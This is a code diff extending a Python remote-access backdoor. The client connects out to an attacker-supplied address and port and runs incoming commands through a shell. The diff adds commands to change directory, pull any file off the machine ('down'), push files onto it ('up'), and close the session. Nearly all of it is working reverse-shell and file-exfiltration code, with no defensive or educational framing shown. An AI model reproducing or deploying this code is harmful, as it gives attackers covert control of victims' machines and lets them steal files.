@@ -2,27 +2,77 @@ from socket import *
 import subprocess
 import argparse
 from termcolor import cprint
+import os
 
 class Backdoor:
     def __init__(self, address, port):
-        self.connection = socket(AF_INET, SOCK_STREAM)
-        self.connection.connect((address, port))
+        self.sd = socket(AF_INET, SOCK_STREAM)
+        self.sd.connect((address, port))
 
     def execute_sys_cmd(self, command):
         return subprocess.check_output(command, shell=True)
 
+    def change_dir(self, path):
+        try:
+            os.chdir(path)
+            return f'Changing directory to {path}'
+        except:
+            return f"Directory doesn't exist"
+
+    def send_file(self, path):
+        if os.path.exists(path) and os.path.isfile(path):
+            with open(path, 'rb') as f:
+                f_bytes = f.read()
+                return f'{len(f_bytes)}\r\n'.encode()+f_bytes
+        else:
+            return b'0\r\n'
+        
+    def receive_file(self, size, name):
+        file_bytes = self.sd.recv(size)
+        
+        with open(name, 'wb') as f:
+            f.write(file_bytes)
+
+    def read_until_CRLF(self):
+        size = ''
+        
+        while True:
+            size += self.sd.recv(1).decode('utf-8','ignore')
+
+            if size.endswith('\r\n'):
+                break
+
+        return size[:-2]
+
     def run(self):
         while True:
             try:
-                command = self.connection.recv(1024).decode()
-                result = self.execute_sys_cmd(command).decode()
-                self.connection.send(f'{len(result)}\r\n{result}'.encode())
+                command = self.read_until_CRLF()
+                cmd_list = command.split(' ')
+
+                if cmd_list[0]=='exit':
+                    self.sd.send(b'17\r\nCLOSED CONNECTION')
+                    self.sd.close()
+                    exit()
+                
+                elif cmd_list[0]=='cd' and len(cmd_list)>1:
+                    result = self.change_dir(cmd_list[1])
+                    self.sd.send(f'{len(result)}\r\n{os.getcwd()}\r\n{result}'.encode())
+                
+                elif cmd_list[0]=='down' and len(cmd_list)>1:
+                    result = self.send_file(cmd_list[1])
+                    self.sd.send(result)
+
+                elif cmd_list[0]=='up' and len(cmd_list)>1:
+                    size = self.read_until_CRLF()
+                    self.receive_file(int(size), cmd_list[1])
+
+                else:
+                    result = self.execute_sys_cmd(command).decode()
+                    self.sd.send(f'{len(result)}\r\n{result}'.encode())
             
             except subprocess.CalledProcessError:
-                self.connection.send(b'10\r\nNO COMMAND')
-
-        self.connection.close()
-
+                self.sd.send(b'10\r\nNO COMMAND')
 
 '''
 Error raised if the user doesn't specify a valid target IP address
